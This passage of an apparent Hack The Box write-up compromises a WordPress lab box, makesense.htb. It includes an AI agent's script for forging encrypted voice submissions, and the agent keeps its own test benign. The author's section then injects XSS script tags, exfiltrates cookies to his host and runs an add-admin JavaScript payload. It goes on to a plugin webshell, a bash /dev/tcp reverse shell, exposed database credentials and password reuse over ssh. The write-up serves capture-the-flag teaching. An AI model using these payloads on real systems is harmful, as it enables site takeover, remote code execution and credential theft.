  Ran 1 shell command (ctrl+o to expand)

● Interesting — there's a hardcoded encryption key. Let me read the full file.

Read 1 file (ctrl+o to expand)

● This file defines the transcriber and the encryptPayload function, but the actual submission (the AJAX POST) happens elsewhere. I need to find the code that calls encryptPayload and posts it. Let me find the page and related scripts.

  Ran 1 shell command (ctrl+o to expand)

● Directory listing is enabled. Let me see the full listing of that whisper directory.

  Ran 1 shell command (ctrl+o to expand)

● Only two files here. The submission logic that calls encryptPayload must be inline on a page or in another theme script. Let me find where the recorder UI lives. Let me look at the homepage and the theme's JS folder.

  Ran 1 shell command (ctrl+o to expand)

● There's the AJAX config: ajax_url, nonce. The submit logic is likely in main.js. Let me fetch it.

  Ran 1 shell command (ctrl+o to expand)

● Now I understand the flow. There are three AJAX actions. The voice channel is a two-phase flow: save_voice_raw (upload WAV → get post_id), then save_voice_results (upload AES-GCM-encrypted {transcription, summary} tied to that post_id). Let me read the exact details.

Read 1 file (ctrl+o to expand)

● I now have the complete picture. Here's the channel:

Flow (no mic needed):
1. POST admin-ajax.php action save_voice_raw with nonce + a voice_recording WAV file → returns a post_id.
2. Encrypt {transcription, summary} with AES-GCM: key = SHA-256(ENCRYPTION_KEY), 12-byte IV prepended, tag appended (WebCrypto style), base64.
3. POST action save_voice_results with nonce + post_id + encrypted_payload.

The transcription is done client-side, so we control the exact text — we just supply any WAV (even silence) for phase 1 and send whatever text we want as the encrypted transcription. The nonce is public on the homepage, so anonymous submission works. Let me quickly confirm save_voice_raw's response shape, then write the script.

Read 1 file (ctrl+o to expand)

● I have everything I need. Let me set up the directories and write the script.

  Ran 1 shell command (ctrl+o to expand)

● Write(submit_audio.py)
  ⎿  Wrote 183 lines to submit_audio.py
       1 #!/usr/bin/env python3
       2 # /// script
       3 # requires-python = ">=3.9"
       5 # ///
       6 """
       7 submit_audio.py — Submit text through makesense.htb's "audio" ch
         annel without a microphone.
       9 Background (from whisper-wrapper.js / main.js):
      10   The voice feature records audio, transcribes + summarizes it c
         lient-side (in the
     … +207 lines (ctrl+o to expand)

● Now let me test it with a harmless benign transcription (no exploit payload, per your instruction — just proving the channel works).

  Ran 1 shell command (ctrl+o to expand)

● It works end-to-end. The server accepted the silent WAV (phase 1 → post_id: 80) and the encrypted text payload (phase 2 → "Results saved successfully!"). We submitted via the audio channel with no microphone.

● Done. The audio submission channel is fully replicated and working.

Summary

The "audio" feature isn't really audio on the server side — all transcription happens in the browser, and the server only receives an AES-GCM-encrypted text payload. That means a mic is unnecessary; we control the submitted text directly.

The channel (two admin-ajax.php actions):
1. save_voice_raw — upload any WAV + the public nonce → returns a post_id. We send 0.5s of silence.
2. save_voice_results — send nonce + post_id + encrypted_payload (base64 AES-GCM of {"transcription","summary"}).

Crypto (from encryptPayload in whisper-wrapper.js): key = SHA-256('bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'), 12-byte random IV prepended, GCM tag appended, base64-encoded. Python's cryptography AESGCM.encrypt() matches WebCrypto's output byte-for-byte.

Script: /home/oxdf/fakemic/scripts_claude/submit_audio.py cd scripts_claude uv run submit_audio.py "your text here" ["optional summary"] It scrapes a fresh nonce from the homepage each run, so it won't break on nonce expiry.

Verified: a benign test message submitted as post_id 80, both phases returning success:true. Notes written to /home/oxdf/fakemic/claude_notes.md.

One thing I noticed while reading (just flagging, not acting on it): applySymbolMapping in the wrapper maps spoken words to symbols and is explicitly commented "for XSS injection" — the transcription text looks like the intended injection sink, and since we build the payload ourselves we'd bypass that mapping and send literal characters. That's the natural next step whenever you want to move from "submit" to "exploit."

✻ Cogitated for 2m 21s · done 3:19 AM
```

The resulting script submits a silent WAV file and then submits a transcription / summary based on what is input as an argument:

```python
#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = ["requests", "cryptography"]
# ///
"""
submit_audio.py — Submit text through makesense.htb's "audio" channel without a microphone.

Background (from whisper-wrapper.js / main.js):
  The voice feature records audio, transcribes + summarizes it client-side (in the
  browser), then AES-GCM-encrypts {transcription, summary} and POSTs it to WordPress
  admin-ajax.php. Transcription happens entirely on the client, so the server never
  sees the audio text -- only the encrypted payload we send. That means we can supply
  ANY transcription/summary text we like; we just need a WAV for phase 1 and the shared
  AES key (hardcoded in whisper-wrapper.js).

Channel (two admin-ajax.php actions):
  1. save_voice_raw     : multipart POST, nonce + voice_recording (WAV) -> returns post_id
  2. save_voice_results : POST nonce + post_id + encrypted_payload (base64 AES-GCM)

Encryption (matches WhisperTranscriber.encryptPayload):
  key   = SHA-256(ENCRYPTION_KEY)                 # 32-byte AES-256 key
  iv    = 12 random bytes
  ct    = AES-GCM(key, iv).encrypt(JSON(payload)) # cryptography appends 16-byte tag
  out   = base64( iv || ct_with_tag )

Usage:
  uv run submit_audio.py "the transcription text" ["optional summary text"]
  uv run submit_audio.py --transcription "..." --summary "..."
  uv run submit_audio.py --help
"""

import argparse
import base64
import hashlib
import io
import json
import re
import struct
import sys

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Hardcoded in whisper-wrapper.js (must match server-side).
ENCRYPTION_KEY = b"bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"

BASE = "https://makesense.htb"
AJAX_URL = f"{BASE}/wp-admin/admin-ajax.php"
HOMEPAGE = f"{BASE}/"

# Browser-y UA + Referer so the request looks like it came from the site.
HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"
    ),
    "Referer": BASE + "/",
    "Origin": BASE,
}


def fetch_nonce(session: requests.Session) -> str:
    """Scrape the live webagency_ajax nonce from the homepage.

    The nonce is printed inline for anonymous visitors, so grabbing a fresh one
    each run avoids failures from an expired hardcoded value.
    """
    r = session.get(HOMEPAGE, timeout=30, verify=False)
    r.raise_for_status()
    m = re.search(r'"nonce"\s*:\s*"([a-f0-9]+)"', r.text)
    if not m:
        raise RuntimeError("Could not find webagency_ajax nonce on homepage")
    return m.group(1)


def make_silent_wav(seconds: float = 0.5, sample_rate: int = 16000) -> bytes:
    """Build a minimal valid 16-bit mono PCM WAV of silence (no mic required).

    Phase 1 only needs *a* WAV file on disk server-side; the real text is carried
    in the phase-2 encrypted payload, so silence is fine.
    """
    n_samples = int(seconds * sample_rate)
    data = b"\x00\x00" * n_samples  # 16-bit zero samples
    block_align = 2  # mono * 16-bit
    byte_rate = sample_rate * block_align

    buf = io.BytesIO()
    buf.write(b"RIFF")
    buf.write(struct.pack("<I", 36 + len(data)))
    buf.write(b"WAVE")
    buf.write(b"fmt ")
    buf.write(struct.pack("<I", 16))          # fmt chunk size
    buf.write(struct.pack("<H", 1))           # PCM
    buf.write(struct.pack("<H", 1))           # channels
    buf.write(struct.pack("<I", sample_rate))
    buf.write(struct.pack("<I", byte_rate))
    buf.write(struct.pack("<H", block_align))
    buf.write(struct.pack("<H", 16))          # bits per sample
    buf.write(b"data")
    buf.write(struct.pack("<I", len(data)))
    buf.write(data)
    return buf.getvalue()


def encrypt_payload(payload: dict) -> str:
    """Replicate WhisperTranscriber.encryptPayload (AES-GCM, base64 of iv||ct||tag)."""
    key = hashlib.sha256(ENCRYPTION_KEY).digest()          # SHA-256 -> 32 bytes
    aesgcm = AESGCM(key)
    iv = __import__("os").urandom(12)                      # 12-byte IV, like WebCrypto
    data = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    ct = aesgcm.encrypt(iv, data, None)                    # ciphertext + 16-byte tag
    return base64.b64encode(iv + ct).decode("ascii")


def save_voice_raw(session: requests.Session, nonce: str, wav: bytes):
    files = {"voice_recording": ("voice-message.wav", wav, "audio/wav")}
    data = {"action": "save_voice_raw", "nonce": nonce}
    r = session.post(AJAX_URL, data=data, files=files, headers=HEADERS,
                     timeout=60, verify=False)
    r.raise_for_status()
    return r.json()


def save_voice_results(session: requests.Session, nonce: str, post_id, enc: str):
    data = {
        "action": "save_voice_results",
        "nonce": nonce,
        "post_id": str(post_id),
        "encrypted_payload": enc,
    }
    r = session.post(AJAX_URL, data=data, headers=HEADERS, timeout=60, verify=False)
    r.raise_for_status()
    return r.json()


def main():
    ap = argparse.ArgumentParser(description="Submit text via makesense.htb audio channel")
    ap.add_argument("transcription", nargs="?", help="transcription text to submit")
    ap.add_argument("summary", nargs="?", help="summary text (defaults to transcription)")
    ap.add_argument("--transcription", dest="t_flag")
    ap.add_argument("--summary", dest="s_flag")
    args = ap.parse_args()

    transcription = args.t_flag or args.transcription
    if not transcription:
        ap.error("provide a transcription (positional or --transcription)")
    summary = args.s_flag or args.summary or transcription

    requests.packages.urllib3.disable_warnings()  # self-signed cert on the box
    session = requests.Session()

    print("[*] Fetching fresh nonce from homepage...")
    nonce = fetch_nonce(session)
    print(f"[+] nonce = {nonce}")

    print("[*] Phase 1: uploading silent WAV (save_voice_raw)...")
    raw_resp = save_voice_raw(session, nonce, make_silent_wav())
    print(f"    response: {raw_resp}")
    if not raw_resp.get("success"):
        print("[-] save_voice_raw failed", file=sys.stderr)
        sys.exit(1)
    post_id = raw_resp["data"]["post_id"]
    print(f"[+] post_id = {post_id}")

    print("[*] Encrypting payload {transcription, summary}...")
    payload = {"transcription": transcription, "summary": summary}
    enc = encrypt_payload(payload)
    print(f"    payload   = {payload}")
    print(f"    encrypted = {enc[:60]}... ({len(enc)} b64 chars)")

    print("[*] Phase 2: submitting encrypted results (save_voice_results)...")
    res_resp = save_voice_results(session, nonce, post_id, enc)
    print(f"    response: {res_resp}")
    if not res_resp.get("success"):
        print("[-] save_voice_results failed", file=sys.stderr)
        sys.exit(1)

    print(f"[+] Done. Submitted via audio channel as post_id {post_id}.")


if __name__ == "__main__":
    main()
```

Claude did submit a test case which is now in the admin panel:

![image-20261020162121898](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1f65aa2088eee3d9.png)

![image-20261020162121898](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020162121898.webp)

### XSS POC

#### Via Form (Unintended)

On seeing that the contact form ends up here, I’ll try HTML injection to see if I can get it displayed on the site. In the image above there’s a case where I sent `<b>bold</b>`, and it worked. I’ll send a simple `script` tag injection:

![image-20261020160123186](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1f37af148db00229.png)

![image-20261020160123186](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020160123186.webp)

On the admin panel, it shows as empty:

![image-20261020160235427](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/47b7156e6c746226.png)

![image-20261020160235427](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020160235427.webp)

Loading it doesn’t trigger a connection back. The dev tools console shows why. The admin panel is served over HTTPS, and the browser blocks loading a script over HTTP as mixed content:

![image-20261020160419222](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f38ada827e73db6b.png)

![image-20261020160419222](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020160419222.webp)

However, in a pretty unrealistic break for me, whatever bot is running on the machine doesn’t seem to care:

```
oxdf@hacky$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.111.98 - - [21/Oct/2026 03:04:29] code 404, message File not found
10.129.111.98 - - [21/Oct/2026 03:04:29] "GET /form.js HTTP/1.1" 404 -
```

#### Via Audio

I’ll use the script from above to create another `script` tag in the admin panel:

```sql
oxdf@hacky$ uv run submit_audio.py -h
Installed 8 packages in 12ms
usage: submit_audio.py [-h] [--transcription T_FLAG] [--summary S_FLAG] [transcription] [summary]

Submit text via makesense.htb audio channel

positional arguments:
  transcription         transcription text to submit
  summary               summary text (defaults to transcription)

options:
  -h, --help            show this help message and exit
  --transcription T_FLAG
  --summary S_FLAG
```

I’ll try script payloads in both the transcription and the summary fields:

```python
oxdf@hacky$ uv run submit_audio.py '<script src="http://10.10.15.169/transcription.js" />' '<script src="http://10.10.15.169/summary.js" />'
[*] Fetching fresh nonce from homepage...
[+] nonce = e5cded4175
[*] Phase 1: uploading silent WAV (save_voice_raw)...
    response: {'success': True, 'data': {'message': 'Audio saved, processing started.', 'post_id': 82}}
[+] post_id = 82
[*] Encrypting payload {transcription, summary}...
    payload   = {'transcription': '<script src="http://10.10.15.169/transcription.js" />', 'summary': '<script src="http://10.10.15.169/summary.js" />'}
    encrypted = fDq30+eA+fGHLDN6e9cT/ZZbfR6E/Mrqx6uJk6pZmA3KoFJAtviFfimwBDeq... (220 b64 chars)
[*] Phase 2: submitting encrypted results (save_voice_results)...
    response: {'success': True, 'data': {'message': 'Results saved successfully!', 'post_id': 82}}
[+] Done. Submitted via audio channel as post_id 82.
```

For some reason that I didn’t bother to troubleshoot, the transcription doesn’t show up, but the summary does:

![image-20261020162422885](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/da5814c9732a4e16.png)

![image-20261020162422885](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020162422885.webp)

Just like with the previous, the script doesn’t load from my browser, but it does from the bot:

```
10.129.111.98 - - [21/Oct/2026 03:24:28] code 404, message File not found
10.129.111.98 - - [21/Oct/2026 03:24:28] "GET /summary.js HTTP/1.1" 404 -
```

### Abuse XSS

#### Cookie Exfil Fail

I can’t capture the admin user’s cookie because the WordPress cookies are `httponly`. Given my [recent experience with this on HTB: Eloquia](https://0xdf.gitlab.io/2026/10/17/htb-eloquia.html#bot-cookie-mistake), I’ll still try, putting a payload like this into `summary.js`:

```javascript
new Image().src = 'http://10.10.15.169/c?=' + document.cookie;
```

It doesn’t exfil any useful cookies (as expected):

```
10.129.111.98 - - [21/Oct/2026 03:32:30] "GET /summary.js HTTP/1.1" 200 -
10.129.111.98 - - [21/Oct/2026 03:32:30] code 404, message File not found
10.129.111.98 - - [21/Oct/2026 03:32:30] "GET /c?=wp-settings-time-3=1792528349 HTTP/1.1" 404 -
```

#### Admin Account

There’s a nice `add_admin.js` file from [WPForce](https://github.com/n00py/WPForce/blob/master/add_admin.js) that I can use here. I’ll save a copy on my host as `summary.js`, and update the `url`, `login`, `pass`, and `email`:

```javascript
//Use this to exploit XSS to compromise the application.  
// just use the XSS payload of <script src=http://[MY_EVIL_SERVER]/add_admin.js>
//Host this file on your server 
url = "/wp-admin/user-new.php";
var login = "0xdf";
var pass = "0xdf0xdf.";
var email =  "0xdf@0xdf.htb";

function httpGet(url)
{
                    var xmlHttp = new XMLHttpRequest();
                    xmlHttp.open( "GET", url, false ); // false for synchronous request
                    xmlHttp.send( null );
                    return xmlHttp.responseText;
}
var all = httpGet(url);
var nonce = all.split("name=\"_wpnonce_create-user\" value=\"");
var nonce = nonce[1].slice(0, 10);
var http = new XMLHttpRequest();
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" + login + "&email=" + email + "&first_name=&last_name=&url=&pass1=" + pass + "&pass1-text=" + pass + "&pass2=" + pass + "&pw_weak=on&role=administrator&createuser=Add+New+User";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.send(params);
new Image().src = 'http://10.10.15.169/admin_created';
```

I’m using a relative path for `url`, so the requests go to the same `https` origin as the admin page, and to avoid and DNS / `hosts` file lapses on the creators part. I’ll also leave the new `Image` tag at the bottom as a signal that the script ran all the way through.

It reports success:

```
10.129.111.98 - - [21/Oct/2026 03:42:29] "GET /summary.js HTTP/1.1" 200 -
10.129.111.98 - - [21/Oct/2026 03:42:29] code 404, message File not found
10.129.111.98 - - [21/Oct/2026 03:42:29] "GET /admin_created HTTP/1.1" 404 -
```

I’ll log in as 0xdf / 0xdf0xdf., and it works!

![image-20261020164333544](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/eb2b0ea4960d4e85.png)

![image-20261020164333544](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020164333544.webp)

### Shell

#### Webshell

I’ll modify an existing plugin (just like I showed on [HTB: Spectra](https://0xdf.gitlab.io/2021/06/26/htb-spectra.html#edit-existing-plugin)) by going to “Plugins” -> “Plugin File Editor”. It opens up `akismet.php` in the Akismet Anti-spam plugin by default. I’ll add a simple webshell at the top of the code:

![image-20261020165400474](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020165400474.webp)

I’ll hit “Update File” at the bottom of the form, and it saves. Now I can trigger it from the URL I called out in Spectra:

```
oxdf@hacky$ curl -k https://makesense.htb/main/wp-content/plugins/akismet/akismet.php -d 'cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `/main/` part of that URL is a bit interesting, and in fact, I can trigger this from almost any URL. I’ll dive into this in [Beyond Root](#modified-plugin-location).

#### Reverse Shell

I’ll use the webshell to get a reverse shell with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```
oxdf@hacky$ curl -k https://makesense.htb/main/wp-content/plugins/akismet/akismet.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.15.169/443 0>%261"'
```

This hangs, but at my listening `nc`:

```ruby
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.111.98 52644
bash: cannot set terminal process group (1410): Inappropriate ioctl for device
bash: no job control in this shell
www-data@makesense:/var/www/html$ 
```

I’ll upgrade using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```ruby
www-data@makesense:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@makesense:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@makesense:/var/www/html$
```

## Shell as walter

### Enumeration

#### Users

There are two users with home directories in `/home`:

```
www-data@makesense:/home$ ls
admin  walter
```

www-data can’t access either. Those are the same two users (plus root) who have shells configured in `passwd`:

```bash
www-data@makesense:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
walter:x:1000:1000:walter:/home/walter:/bin/bash
admin:x:1001:1001:,,,:/home/admin:/bin/bash
```

#### Web

The WordPress install is in `/var/www/html`:

```ruby
www-data@makesense:/var/www/html$ ls
index.php        wp-blog-header.php    wp-includes        wp-signup.php
license.txt      wp-comments-post.php  wp-links-opml.php  wp-trackback.php
readme.html      wp-config-sample.php  wp-load.php        xmlrpc.php
scripts          wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
```

`/var/www/html/wp-config.php` has the database connection information, despite the fact that it’s using SQLite:

```php
<?php
// SQLite database configuration
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );

$table_prefix = 'wp_';
define( 'WP_DEBUG', false );

define('AUTH_KEY',         '%88$_8C0xYR s^9jz;F epY,CO|+Up#ZFIdRS&Gqd~5O/|<^7DmLtEm=SjV|jmWZ');
define('SECURE_AUTH_KEY',  'BD-p*m6hvWAGGBDg%_UC,|>};`C2<1uK>*x!h.Wf*dE;lbhaQVbHw+uc@6OfH>B%');
define('LOGGED_IN_KEY',    ';2fn^sP8F`HK0g,8C&2ar})EifGz@,5Z1{IoDD+CzOT@3w[g~*aM-+=zWcxGBYk2');
define('NONCE_KEY',        's>>f8%soM5P=D$J9UXV-kF]lKZ92.KF%FDS#+! ;(A|C9kMWT(=A>99->-$$>UvU');
define('AUTH_SALT',        'V 0X(1n-@p&})rQpQB_mEax]D9Z*;iM+23&b]!53._;,).:Lj?1ky56*Vaa~KF(B');
define('SECURE_AUTH_SALT', '-{[x4pgl %S5{_s}nE!%H8,05AO_699M4_[mLt^tVC$Kh4;s|n8~O<CSE4#uPWN.');
define('LOGGED_IN_SALT',   'wUxZI^1#)4o)C1KJ8a5o-k{V3L)agi|fofV0SzuSUI;1k%1 !9Q!P@-*j8Y_j%$;');
define('NONCE_SALT',       'j #rMhd[olj2$j8|QAF7L8rR-D kf&gs,:oX4py6x?6V3|oJ?[b~h,[~3uhH.|X%');

if ( ! defined( 'ABSPATH' ) ) {
    define( 'ABSPATH', __DIR__ . '/' );
}

define( 'WP_SQLITE_PLUGIN', true );
require_once ABSPATH . 'wp-settings.php';
```

### Password Reuse

The password from the config works for the walter account on the box with `su`:

```ruby
www-data@makesense:/$ su - walter
Password: 
walter@makesense:~$ 
```

And with `ssh`:

```ruby
oxdf@hacky$ sshpass -p 'JbhHDAEgXvri3!' ssh walter@makesense.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...[snip]...
walter@makesense:~$ 
```

Either way I can grab `user.txt`:

```
walter@makesense:~$ cat user.txt
be8425c2************************
```

## Shell as root

### Enumeration

#### User

walter’s home directory is pretty empty:

```sql
walter@makesense:~$ ls -la
total 32
drwxr-x--- 4 walter walter 4096 Jul  1 00:45 .
drwxr-xr-x 4 root   root   4096 Jul  1 00:45 ..
lrwxrwxrwx 1 root   root      9 May 29 17:11 .bash_history -> /dev/null
-rw-r--r-- 1 walter walter  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 walter walter 3771 Mar 31  2024 .bashrc
drwx------ 2 walter walter 4096 Jul  1 00:45 .cache
-rw-r--r-- 1 walter walter  807 Mar 31  2024 .profile
drwx------ 2 walter walter 4096 Jul  1 00:45 .ssh
-rw-r----- 1 root   walter   33 Oct 20 19:10 user.txt
```

walter cannot run `sudo`:

```
walter@makesense:~$ sudo -l
[sudo] password for walter: 
Sorry, user walter may not run sudo on makesense.
```

#### Identify Webserver

I’ll check for listening ports:

```ruby
walter@makesense:~$ ss -tnlp
State        Recv-Q       Send-Q               Local Address:Port               Peer Address:Port       Process       
LISTEN       0            4096                 127.0.0.53%lo:53                      0.0.0.0:*                        
LISTEN       0            4096                       0.0.0.0:22                      0.0.0.0:*                        
LISTEN       0            511                        0.0.0.0:80                      0.0.0.0:*                        
LISTEN       0            511                        0.0.0.0:443                     0.0.0.0:*                        
LISTEN       0            4096                    127.0.0.54:53                      0.0.0.0:*                        
LISTEN       0            4096                     127.0.0.1:8001                    0.0.0.0:*  
```

80 is just the WordPress site which Apache is proxying to through HTTPS. The only interesting port is 8001.

The process list shows what this is:

```
walter@makesense:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3  22060 13392 ?        Ss   19:09   0:03 /sbin/init splash noprompt noshell automatic-ubiquity vt.handoff=7
root           2  0.0  0.0      0     0 ?        S    19:09   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    19:09   0:00 [pool_workqueue_release]
root           4  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-rcu_g]
root           5  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-rcu_p]
root           6  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-slub_]
root           7  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-netns]
root           8  0.0  0.0      0     0 ?        I    19:09   0:07 [kworker/0:0-cgroup_free]
root          12  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-mm_pe]
root          13  0.0  0.0      0     0 ?        I    19:09   0:00 [rcu_tasks_kthread]
root          14  0.0  0.0      0     0 ?        I    19:09   0:00 [rcu_tasks_rude_kthread]
root          15  0.0  0.0      0     0 ?        I    19:09   0:00 [rcu_tasks_trace_kthread]
root          16  0.0  0.0      0     0 ?        S    19:09   0:00 [ksoftirqd/0]
root          17  0.0  0.0      0     0 ?        I    19:09   0:07 [rcu_preempt]
root          18  0.0  0.0      0     0 ?        S    19:09   0:00 [migration/0]
root          19  0.0  0.0      0     0 ?        S    19:09   0:00 [idle_inject/0]
root          20  0.0  0.0      0     0 ?        S    19:09   0:00 [cpuhp/0]
root          21  0.0  0.0      0     0 ?        S    19:09   0:00 [cpuhp/1]
root          22  0.0  0.0      0     0 ?        S    19:09   0:00 [idle_inject/1]
root          23  0.0  0.0      0     0 ?        S    19:09   0:00 [migration/1]
root          24  0.0  0.0      0     0 ?        S    19:09   0:00 [ksoftirqd/1]
root          26  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/1:0H-events_highpri]
root          27  0.0  0.0      0     0 ?        S    19:09   0:00 [kdevtmpfs]
root          28  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-inet_]
root          29  0.0  0.0      0     0 ?        S    19:09   0:07 [kauditd]
root          30  0.0  0.0      0     0 ?        S    19:09   0:00 [khungtaskd]
root          32  0.0  0.0      0     0 ?        S    19:09   0:00 [oom_reaper]
root          34  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-write]
root          35  0.0  0.0      0     0 ?        S    19:09   0:00 [kcompactd0]
root          36  0.0  0.0      0     0 ?        SN   19:09   0:00 [ksmd]
root          38  0.0  0.0      0     0 ?        SN   19:09   0:00 [khugepaged]
root          39  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-kinte]
root          40  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-kbloc]
root          41  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-blkcg]
root          42  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/9-acpi]
root          43  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-tpm_d]
root          44  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-ata_s]
root          45  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-md]
root          46  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-md_bi]
root          47  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-edac-]
root          48  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-devfr]
root          49  0.0  0.0      0     0 ?        S    19:09   0:00 [watchdogd]
root          50  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-quota]
root          51  0.0  0.0      0     0 ?        I<   19:09   0:01 [kworker/1:1H-kblockd]
root          52  0.0  0.0      0     0 ?        S    19:09   0:00 [kswapd0]
root          53  0.0  0.0      0     0 ?        S    19:09   0:00 [ecryptfs-kthread]
root          54  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-kthro]
root          55  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/24-pciehp]
root          56  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/25-pciehp]
root          57  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/26-pciehp]
root          58  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/27-pciehp]
root          59  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/28-pciehp]
root          60  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/29-pciehp]
root          61  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/30-pciehp]
root          62  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/31-pciehp]
root          63  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/32-pciehp]
root          64  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/33-pciehp]
root          65  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/34-pciehp]
root          66  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/35-pciehp]
root          67  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/36-pciehp]
root          68  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/37-pciehp]
root          69  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/38-pciehp]
root          70  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/39-pciehp]
root          71  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/40-pciehp]
root          72  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/41-pciehp]
root          73  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/42-pciehp]
root          74  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/43-pciehp]
root          75  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/44-pciehp]
root          76  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/45-pciehp]
root          77  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/46-pciehp]
root          78  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/47-pciehp]
root          79  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/48-pciehp]
root          80  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/49-pciehp]
root          81  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/50-pciehp]
root          82  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/51-pciehp]
root          83  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/52-pciehp]
root          84  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/53-pciehp]
root          85  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/54-pciehp]
root          86  0.0  0.0      0     0 ?        S    19:09   0:00 [irq/55-pciehp]
root          87  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-acpi_]
root          88  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_0]
root          89  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root          90  0.0  0.0      0     0 ?        S    19:09   0:00 [scsi_eh_1]
root          91  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-scsi_]
root          95  0.0  0.0      0     0 ?        I<   19:09   0:00 [kworker/R-kstrp]
